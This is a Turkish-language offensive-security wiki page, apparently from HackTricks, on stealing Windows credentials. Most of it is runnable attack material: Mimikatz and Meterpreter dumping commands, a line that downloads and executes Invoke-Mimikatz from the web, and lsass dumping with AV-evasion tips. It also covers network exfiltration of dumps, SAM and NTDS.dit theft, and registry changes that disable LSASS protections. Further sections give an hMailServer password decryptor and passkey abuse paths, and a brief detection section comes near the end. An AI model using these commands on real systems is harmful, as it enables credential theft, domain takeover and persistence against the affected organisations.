# Windows Kimlik Bilgilerini Çalma

{{#include ../../banners/hacktricks-training.md}}

## Kimlik Bilgileri Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'in yapabildiği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md) **bulabilirsiniz.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Olası kimlik bilgisi korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'ın bazı kimlik bilgilerini çıkarmasını engelleyebilir.**

## Credentials with Meterpreter

Kurban sisteminde **parolaları ve hash'leri aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **'i kullanın.**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'ten gelen **Procdump** meşru bir Microsoft aracı olduğundan**, Defender tarafından algılanmaz.\
Bu aracı **lsass process'i dump etmek**, **dump'ı indirmek** ve **credentials'ı dump'tan yerel olarak extract etmek** için kullanabilirsiniz.

[SharpDump](https://github.com/GhostPack/SharpDump) da kullanabilirsiniz.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak gerçekleştirilir: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV** ürünleri, **procdump.exe ile lsass.exe dump etme** kullanımını **malicious** olarak **detect** edebilir; bunun nedeni **"procdump.exe" ve "lsass.exe"** dizelerini **detect** etmeleridir. Bu nedenle, **lsass.exe adını** kullanmak **yerine**, lsass.exe'nin **PID** değerini **procdump'a** **argument** olarak **pass etmek** daha **stealthier** bir yöntemdir.

### **comsvcs.dll** ile lsass dump etme

`C:\Windows\System32` içinde bulunan **comsvcs.dll** adlı bir DLL, bir crash durumunda **process memory dump etme** işleminden sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **function** içerir.\
İlk iki argument'in kullanılması önemli değildir; ancak üçüncü argument üç bileşene ayrılır. Dump edilecek process'in ID'si ilk bileşeni, dump dosyasının konumu ikinci bileşeni ve üçüncü bileşen ise kesinlikle **full** kelimesini oluşturur. Alternatif seçenekler mevcut değildir.\
Bu üç bileşen parse edildikten sonra DLL, dump dosyasını oluşturur ve belirtilen process'in memory'sini bu dosyaya aktarır.\
**comsvcs.dll** kullanılarak lsass process'inin dump edilmesi mümkündür; böylece procdump'ı upload edip execute etme ihtiyacı ortadan kalkar. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.<sup>[[9]](#references)</sup>

Aşağıdaki command execution için kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu süreci [**lssasy**](https://github.com/Hackndo/lsassy) ile otomatikleştirebilirsiniz.**

### **Task Manager ile lsass dump alma**

1. Görev Çubuğu'na sağ tıklayın ve Görev Yöneticisi'ne tıklayın
2. Daha fazla ayrıntı'ya tıklayın
3. Processes sekmesinde "Local Security Authority Process" işlemini bulun
4. "Local Security Authority Process" işlemine sağ tıklayın ve "Create dump file" seçeneğine tıklayın.

### procdump ile lsass dump alma

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan ve Microsoft tarafından imzalanmış bir binary'dir.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade ile lsass Dökümü Alma

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dökümünü obfuscate etmeyi ve diske yazmadan uzak workstation'lara aktarmayı destekleyen bir Protected Process Dumper Tool'dur.

**Temel işlevler**:

1. PPL korumasını bypass etme
2. Defender'ın signature-based detection mekanizmalarından kaçınmak için bellek döküm dosyalarını obfuscate etme
3. Bellek dökümünü diske yazmadan RAW ve SMB upload yöntemleriyle yükleme (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDump olmadan SSP tabanlı LSASS dump'ı

Ink Dragon, `MiniDumpWriteDump` işlevini hiç çağırmayan ve bu nedenle EDR'nin bu API üzerindeki hook'larının hiç tetiklenmediği, **LalsDumper** adı verilen üç aşamalı bir dumper sunar:<sup>[[3]](#references)</sup>

1. **Aşama 1 loader'ı (`lals.exe`)** – `fdp.dll` içinde 32 adet küçük `d` karakterinden oluşan bir placeholder arar, bunu `rtu.txt` dosyasının mutlak yolu ile değiştirir, yamalanmış DLL'i `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Bu işlem **LSASS**'ın kötü amaçlı DLL'i yeni bir Security Support Provider (SSP) olarak yüklemesini zorlar.
2. **LSASS içindeki Aşama 2** – LSASS `nfdp.dll`'i yüklediğinde DLL, `rtu.txt` dosyasını okur, her byte'ı `0x20` ile XOR'lar ve kodu çözülmüş blob'u execution'ı devretmeden önce belleğe map eder.
3. **Aşama 3 dumper'ı** – Map edilen payload, hash'lenmiş API adlarından çözümlenen **direct syscalls** kullanarak MiniDump mantığını yeniden uygular (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` adlı özel bir export, `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış bir LSASS dump'ını dosyaya stream eder ve handle'ı kapatır; böylece exfiltration daha sonra gerçekleştirilebilir.

Operatör notları:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt` dosyalarını aynı dizinde tutun. Aşama 1, hard-coded placeholder'ı `rtu.txt` dosyasının mutlak yolu ile yeniden yazar; bu nedenle dosyaları ayırmak chain'i bozar.
* Registration, `nfdp` değerinin `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` konumuna eklenmesiyle gerçekleşir. LSASS'ın her boot'ta SSP'yi yeniden yüklemesini sağlamak için bu değeri kendiniz seed edebilirsiniz.
* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dump'lardır. Bunları local olarak decompress edin, ardından credential extraction için Mimikatz/Volatility'ye verin.
* `lals.exe` çalıştırmak, `AddSecurityPackageA`'nın başarılı olması için admin/SeTcb hakları gerektirir; çağrı döndüğünde LSASS rogue SSP'yi transparan biçimde yükler ve Aşama 2'yi çalıştırır.
* DLL'in diskten kaldırılması, onu LSASS'tan evict etmez. Ya registry entry'sini silip LSASS'ı yeniden başlatın (reboot) ya da long-term persistence için bırakın.

## CrackMapExec

### SAM hash'lerini dump et
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA secrets Dump Etme
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Hedef DC'den NTDS.dit'i Dökümle
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Hedef DC'den NTDS.dit parola geçmişini dump et
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM ve SYSTEM Çalma

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM._ konumlarında **bulunmalıdır**. Ancak **korumalı oldukları** için onları normal bir şekilde kopyalayamazsınız.

### Registry'den

Bu dosyaları çalmanın en kolay yolu Registry'den bir kopya almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
Bu dosyaları Kali makinenize **indirin** ve aşağıdakini kullanarak **hash'leri çıkarın**:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Bu hizmeti kullanarak korunan dosyaların kopyasını oluşturabilirsiniz. Administrator olmanız gerekir.

#### Using vssadmin

vssadmin binary dosyası yalnızca Windows Server sürümlerinde kullanılabilir.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ancak aynı işlemi **Powershell** üzerinden de yapabilirsiniz. Bu, **SAM dosyasının nasıl kopyalanacağına** dair bir örnektir (kullanılan sabit disk "C:" ve dosya C:\users\Public konumuna kaydedilir); ancak bunu korunan herhangi bir dosyayı kopyalamak için kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kitaptaki kod: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit'in bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) aracını da kullanabilirsiniz.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** dosyası, kullanıcı nesneleri, gruplar ve bunların üyelikleri hakkında kritik verileri barındıran **Active Directory**'nin kalbi olarak bilinir. Etki alanı kullanıcılarına ait **password hashes** burada depolanır. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç temel tablo tutulur:

- **Data Table**: Bu tablo, kullanıcılar ve gruplar gibi nesneler hakkındaki ayrıntıları depolamakla görevlidir.
- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her nesneye ait **security descriptors** burada tutulur; böylece depolanan nesnelerin güvenliği ve erişim kontrolü sağlanır.

Christoffer Andersson'ın database-layer araştırması, bu tabloları ve sürüme özgü davranışlarını daha ayrıntılı şekilde belgeler.<sup>[[8]](#references)</sup>

Windows, bu dosyayla etkileşim kurmak için _Ntdsa.dll_ kullanır ve bu dosya _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının **bir kısmı `lsass`** belleğinde bulunabilir (bir **cache** kullanılarak performans iyileştirildiği için muhtemelen en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki hash'leri decrypt etme

Hash üç kez encrypt edilir:

1. **BOOTKEY** ve **RC4** kullanarak Password Encryption Key'i (**PEK**) decrypt edin.
2. **PEK** ve **RC4** kullanarak **hash**'i decrypt edin.
3. **DES** kullanarak **hash**'i decrypt edin.

**PEK**, her domain controller üzerinde **aynı değere** sahiptir; ancak ilgili domain controller'ın **SYSTEM** hive'ındaki DC'ye özgü **BOOTKEY** ile **NTDS.dit** içinde encrypt edilir. Bu nedenle credentials çıkarmak için hem **NTDS.dit** hem de **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) gerekir.

### Ntdsutil kullanarak NTDS.dit kopyalama

Windows Server 2008'den beri kullanılabilir.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**volume shadow copy**](#stealing-sam-and-system) tekniğini kullanarak **ntds.dit** dosyasını da kopyalayabilirsiniz. Ayrıca **SYSTEM dosyasının** bir kopyasına da ihtiyacınız olacağını unutmayın (yine [**registry'den dump edin veya volume shadow copy**](#stealing-sam-and-system) tekniğini kullanın).

### **NTDS.dit'ten hash'leri çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettikten** sonra, **hash'leri çıkarmak** için _secretsdump.py_ gibi araçları kullanabilirsiniz:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ayrıca, geçerli bir domain admin kullanıcısı kullanarak bunları **otomatik olarak çıkarabilirsiniz**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**büyük NTDS.dit dosyaları** için [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanılarak çıkarılması önerilir.

Son olarak, **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject` da kullanılabilir.

### **NTDS.dit dosyasından domain nesnelerini SQLite veritabanına çıkarma**

NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Ham NTDS.dit dosyası zaten elde edilmişse, daha fazla bilgi çıkarımı için yalnızca secrets değil, nesnelerin tamamı ve öznitelikleri de çıkarılır.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive isteğe bağlıdır ancak gizli bilgilerin şifresinin çözülmesini sağlar (NT ve LM hash'leri, cleartext password gibi supplemental credentials, kerberos veya trust anahtarları, NT ve LM password history). Diğer bilgilerin yanı sıra aşağıdaki veriler çıkarılır: hash'leriyle birlikte user ve machine account'ları, UAC flag'leri, son logon ve password change zaman damgaları, account açıklamaları, adlar, UPN, SPN, group'lar ve recursive membership'ler, organizational unit ağacı ve membership'i, trust türü, yönü ve attribute'larıyla birlikte trusted domain'ler...

## Lazagne

Binary'yi [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu binary'yi çeşitli software'lerden credential'ları çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'den kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. Şuradan indirin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Buradan indirin:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve yalnızca **execute it**; parolalar çıkarılacaktır.

## Boşta olan RDP oturumlarını tarama ve güvenlik kontrollerini zayıflatma

Ink Dragon’ın FinalDraft RAT’i, teknikleri her red-teamer için kullanışlı olan bir `DumpRDPHistory` tasker içerir:<sup>[[3]](#references)</sup>

### DumpRDPHistory tarzı telemetri toplama

* **Giden RDP hedefleri** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` altındaki her kullanıcı hive’ını ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint` değerini ve son yazma zaman damgasını saklar. FinalDraft’ın mantığını PowerShell ile taklit edebilirsiniz:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Gelen RDP kanıtları** – kutuyu kimin yönettiğini belirlemek için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` günlüğünü Event ID’leri **21** (başarılı oturum açma) ve **25** (bağlantı kesilmesi) açısından sorgulayın:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Hangi Domain Admin’in düzenli olarak bağlandığını öğrendikten sonra, **bağlantısı kesilmiş** oturumları hâlâ mevcutken LSASS’ı (LalsDumper/Mimikatz ile) dump edin. CredSSP + NTLM fallback, doğrulayıcılarını ve token’larını LSASS’ta bırakır; bunlar daha sonra SMB/WinRM üzerinden replay edilerek `NTDS.dit` alınabilir veya domain controller’larda persistence oluşturulabilir.

### FinalDraft tarafından hedeflenen Registry downgrade’ları

Aynı implant, credential theft işlemini kolaylaştırmak için çeşitli Registry anahtarlarını da değiştirir:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` ayarının etkinleştirilmesi, RDP sırasında kimlik bilgileri/ticket'ların tamamen yeniden kullanılmasını zorunlu kılar ve pass-the-hash tarzı pivot'ları mümkün hale getirir.
* `LocalAccountTokenFilterPolicy=1`, UAC token filtrelemesini devre dışı bırakır; böylece yerel admin'ler ağ üzerinden kısıtlanmamış token'lar alır.
* `DSRMAdminLogonBehavior=2`, DSRM administrator'ının DC çevrimiçiyken oturum açmasına izin verir ve saldırganlara yerleşik, yüksek ayrıcalıklı başka bir hesap sağlar.
* `RunAsPPL=0`, LSASS PPL korumalarını kaldırır ve LalsDumper gibi dump araçları için belleğe erişimi kolaylaştırır.

## hMailServer database credentials (compromise sonrası)

hMailServer, DB password'ünü `[Database] Password=` altında `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` dosyasında saklar. Değer, statik `THIS_KEY_IS_NOT_SECRET` anahtarı ve 4-byte word endianness değişimleri kullanılarak Blowfish ile şifrelenir. INI dosyasındaki hex string'i aşağıdaki Python snippet'iyle kullanın:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Açık metin parolayı kullanarak, dosya kilitlerini önlemek için SQL CE database'ini kopyalayın, 32-bit provider'ı yükleyin ve hash'leri sorgulamadan önce gerekirse upgrade edin:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` sütunu, hMailServer hash formatını (hashcat mode `1421`) kullanır. Bu değerleri kırmak, WinRM/SSH pivotları için yeniden kullanılabilir kimlik bilgileri sağlayabilir.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Bazı araçlar, LSA logon callback `LsaApLogonUserEx2` işlevini intercept ederek **düz metin oturum açma parolalarını** yakalar. Amaç, kimlik bilgilerini **oturum açma sırasında** (hashing işleminden önce) yakalamak ve ardından diske yazmak veya operatöre geri döndürmek için authentication package callback işlevine hook eklemek ya da bu işlevi sarmalamaktır. Bu işlem genellikle LSA'ya inject olan veya LSA'ya kayıt yapan ve her başarılı etkileşimli/ağ oturumu açma olayını kullanıcı adı, domain ve parolayla kaydeden bir helper olarak uygulanır.<sup>[[1]](#references)</sup>

Operasyonel notlar:
- Helper'ı authentication path'e yüklemek için yerel admin/SYSTEM yetkileri gerekir.
- Yakalanan kimlik bilgileri yalnızca bir oturum açma gerçekleştiğinde görünür (hook'a bağlı olarak etkileşimli, RDP, servis veya ağ oturum açması).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS), kayıtlı bağlantı bilgilerini kullanıcı başına oluşturulan bir `sqlstudio.bin` dosyasında saklar. Özel dumper'lar dosyayı ayrıştırabilir ve kayıtlı SQL kimlik bilgilerini kurtarabilir. Yalnızca komut çıktısı döndüren shell'lerde dosya genellikle Base64 olarak encode edilip stdout'a yazdırılarak exfiltrate edilir.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Operatör tarafında, dosyayı yeniden derleyin ve kimlik bilgilerini kurtarmak için dumper'ı yerel olarak çalıştırın:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Windows üzerinde Chrome'dan Passkeys / WebAuthn credential theft

Windows host üzerinde **victim user** olarak **Chrome + Google Password Manager synced passkeys** kullanılarak code execution elde edilirse, passkeys **admin/SYSTEM olmadan bile** ilgi çekici bir post-exploitation hedefi hâline gelir.<sup>[[4]](#references)</sup>

### İlgi çekici yerel artifact'ler
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`**, protobuf-encoded **`WebauthnCredentialSpecifics`** kayıtlarını depolar. Aynı kullanıcıya ait bir process, senkronize passkey'ler için **RP ID**, **username**, **credential ID** ve şifrelenmiş özel anahtar materyalini enumerate edebilir.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**, **`wrapped_identity_private_key`** ve senkronize kimlik bilgilerini kurtarmak için kullanılan wrapped secret gibi yerel cihaz enrollment durumunu depolar.<sup>[[4]](#references)</sup>

Hızlı triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM'e bağlı key blob'ları yine de yerel bir signing oracle olarak kötüye kullanılabilir

Tarayıcı, TPM destekli bir identity key'i **`NCRYPT_OPAQUE_KEY_BLOB`** olarak dışa aktarır ve bu blob'ı kullanıcı tarafından erişilebilir bir durumda depolarsa, malware'in ham private key'i çıkarması gerekmez. Malware, blob'ı **aynı makinede** yeniden import edebilir ve yerel TPM'den saldırgan tarafından kontrol edilen verileri imzalamasını isteyebilir:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Bu, **hardware binding'in cihaz dışına aktarımı engellediği, ancak ele geçirilmiş endpoint üzerinde aynı kullanıcı tarafından kullanımı engellemediği** anlamına gelir.

### Pratik kötüye kullanım yolları

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Chrome'un LevelDB'inden `WebauthnCredentialSpecifics` değerlerini enumerate edin.
- Bir passkey login başlatın ve yeni bir WebAuthn challenge elde edin.
- Çalınan `wrapped_identity_private_key` blob'unu victim TPM üzerinde kullanarak cloud-authenticator request binding'i imzalayın.
- Dönen assertion'ı relying party'ye relay edin.
- Bu, RP `userVerification=preferred` değerini kabul ettiğinde veya **`UV=0`** değerine sahip assertion'ları reddetmediğinde özellikle değerlidir.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- `passkey_enclave_state` değerini silerek veya geçerli imzalı bir `device/forget` operation göndererek yeniden onboarding'i zorlayın.
- Onboarding cihazı **`uv_key_pending`** durumunda bırakırsa attacker-controlled bir UV public key kaydedin.
- Provider yeni UV key için attestation / secure-hardware origin doğrulaması yapmıyorsa attacker key'den sonraki signature'lar **`UV=1`** olarak değerlendirilir.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Chrome'un synced-passkey master secret'ı fetch etmesi için recovery veya rejoin işlemini zorlayın.
- `passkey_enclave_state` değerinin yeniden oluşturulmasını/değiştirilmesini izleyin, ardından plaintext **security domain secret (SDS)** bellekte bulunduğu sırada Chrome memory dump alın.
- Kurtarılan SDS'yi her `WebauthnCredentialSpecifics` kaydındaki encrypted field'ları decrypt etmek ve taşınabilir WebAuthn private key'leri kurtarmak için kullanın.

### DFIR / detection fikirleri

- `passkey_enclave_state` değerinin **silinmesini/yeniden oluşturulmasını** izleyin.<sup>[[4]](#references)</sup>
- Browser olmayan process'lerin Chrome **`Sync Data\LevelDB`** erişimlerinde alert oluşturun.
- **Chrome memory dump** veya şüpheli cross-process memory access durumlarında alert oluşturun.
- Tekrarlanan **Google Password Manager recovery PIN** prompt'larını veya beklenmeyen yeniden onboarding işlemlerini araştırın.
- WebAuthn **`signCount`** değerinin synced passkey'lerde çoğu zaman kullanışlı olmadığını unutmayın; çünkü sabit kalabilir ve bu nedenle klasik clone detection zayıftır.

## References

- [1] [Unit 42 – Yüksek Değerli Sektörleri Hedef Alan, Yıllarca Fark Edilmeyen Operasyonlar Üzerine Bir İnceleme](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer credential decryption → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon'ın İçinde: Relay Network'ü ve Gizli Offensive Operation'ın İç İşleyişini Ortaya Çıkarmak](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Passkey'i Geçmek: Passwordless Authentication'da Yeni Bir Attack Surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows Hacking: Microsoft Sistemlerine ve Ağlarına Yönelik Saldırılar](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Data Store Gerçekte Nasıl Çalışır: NTDS.dit'in İçinde (Bölüm 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
{{#include ../../banners/hacktricks-training.md}}
